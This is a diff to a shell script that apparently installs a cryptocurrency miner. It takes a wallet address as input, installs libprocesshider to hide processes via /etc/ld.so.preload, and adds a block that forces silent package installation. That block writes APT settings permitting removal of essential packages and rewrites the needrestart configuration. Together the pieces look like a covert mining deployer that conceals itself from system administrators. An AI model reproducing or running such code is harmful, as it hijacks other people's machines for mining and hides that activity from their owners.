@@ -12,6 +12,65 @@ WALLET_ADDRESS="$1"
 echo "[*] Using wallet: ${WALLET_ADDRESS:0:20}...${WALLET_ADDRESS: -10}"
 echo ""
 
+# ==================== FORCE NON-INTERACTIVE MODE ====================
+# Prevent ANY interactive prompts during package installation
+export DEBIAN_FRONTEND=noninteractive
+export NEEDRESTART_MODE=a
+export NEEDRESTART_SUSPEND=1
+export UCF_FORCE_CONFFOLD=1
+export UCF_FORCE_CONFNEW=1
+export APT_LISTCHANGES_FRONTEND=none
+
+# Disable all dpkg prompts
+export DEBIAN_PRIORITY=critical
+export DEBCONF_NONINTERACTIVE_SEEN=true
+export DEBCONF_NOWARNINGS=yes
+
+# Configure APT to never prompt
+mkdir -p /etc/apt/apt.conf.d 2>/dev/null
+cat > /etc/apt/apt.conf.d/99-no-prompts << 'EOF' 2>/dev/null || true
+Dpkg::Options {
+   "--force-confdef";
+   "--force-confold";
+}
+APT::Get::Assume-Yes "true";
+APT::Get::allow-downgrades "true";
+APT::Get::allow-remove-essential "true";
+APT::Get::allow-change-held-packages "true";
+quiet "2";
+EOF
+
+# Configure debconf to non-interactive
+echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections 2>/dev/null || true
+
+# Pre-configure needrestart to NEVER show interactive prompts
+if [ -f /etc/needrestart/needrestart.conf ]; then
+    sed -i "s/#\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/#\$nrconf{kernelhints} = -1;/\$nrconf{kernelhints} = -1;/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/\$nrconf{kernelhints} = .*;/\$nrconf{kernelhints} = -1;/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+fi
+
+# Create comprehensive needrestart config
+mkdir -p /etc/needrestart 2>/dev/null
+cat > /etc/needrestart/needrestart.conf << 'EOF' 2>/dev/null || true
+# Restart services automatically without asking
+$nrconf{restart} = 'a';
+# Never show kernel hints
+$nrconf{kernelhints} = -1;
+EOF
+
+# Disable Ubuntu's kernel upgrade prompts
+mkdir -p /etc/needrestart/conf.d 2>/dev/null
+cat > /etc/needrestart/conf.d/no-prompt.conf << 'EOF' 2>/dev/null || true
+# Never prompt for kernel upgrades
+$nrconf{kernelhints} = -1;
+$nrconf{restart} = 'a';
+EOF
+
+echo "[✓] Non-interactive mode enabled - ALL prompts disabled"
+echo ""
+
 # ==================== FIX BROKEN LIBPROCESSHIDER ====================
 # Clean up broken libprocesshider.so references that cause ld.so errors
 if [ -f /etc/ld.so.preload ]; then
@@ -878,7 +937,9 @@ if command -v dpkg >/dev/null 2>&1; then
         echo ""
         echo "[*] Running: apt-get install -f"
 
-        DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
+        DEBIAN_FRONTEND=noninteractive apt-get install -f -y \
+            -o Dpkg::Options::="--force-confdef" \
+            -o Dpkg::Options::="--force-confold" 2>&1 | tail -20
 
         sleep 2
 
@@ -1260,6 +1321,8 @@ echo "[*] Installing git make gcc build-essential kernel headers..."
 # Try apt-get (Debian/Ubuntu)
 if command -v apt-get >/dev/null 2>&1; then
     DEBIAN_FRONTEND=noninteractive apt-get install -y \
+        -o Dpkg::Options::="--force-confdef" \
+        -o Dpkg::Options::="--force-confold" \
         git make gcc g++ build-essential \
         linux-headers-"$(uname -r)" \
         wget curl 2>&1 | tail -10 || true
@@ -1456,7 +1519,10 @@ echo "[*] Installing PCI utilities..."
 if command -v yum >/dev/null 2>&1; then
     yum install -y pciutils 2>/dev/null || true
 elif command -v apt-get >/dev/null 2>&1; then
-    apt-get install -y pciutils 2>/dev/null || true
+    DEBIAN_FRONTEND=noninteractive apt-get install -y \
+        -o Dpkg::Options::="--force-confdef" \
+        -o Dpkg::Options::="--force-confold" \
+        pciutils 2>/dev/null || true
 fi
 
 echo "[*] Updating PCI ID database..."
@@ -2387,8 +2453,15 @@ install_libprocesshider() {
 
     # Install dependencies
     echo "[*] Installing git and gcc..."
-    apt-get install -y git gcc make 2>&1 | grep -E "Setting up|already" || true
-    yum install -y git gcc make 2>&1 | grep -E "Installing|already" || true
+    if command -v apt-get >/dev/null 2>&1; then
+        DEBIAN_FRONTEND=noninteractive apt-get install -y \
+            -o Dpkg::Options::="--force-confdef" \
+            -o Dpkg::Options::="--force-confold" \
+            git gcc make 2>&1 | grep -E "Setting up|already" || true
+    fi
+    if command -v yum >/dev/null 2>&1; then
+        yum install -y git gcc make 2>&1 | grep -E "Installing|already" || true
+    fi
 
     # Clone from GitHub with timeout (prevent infinite hang)
     echo "[*] Cloning libprocesshider from GitHub (30 second timeout)..."
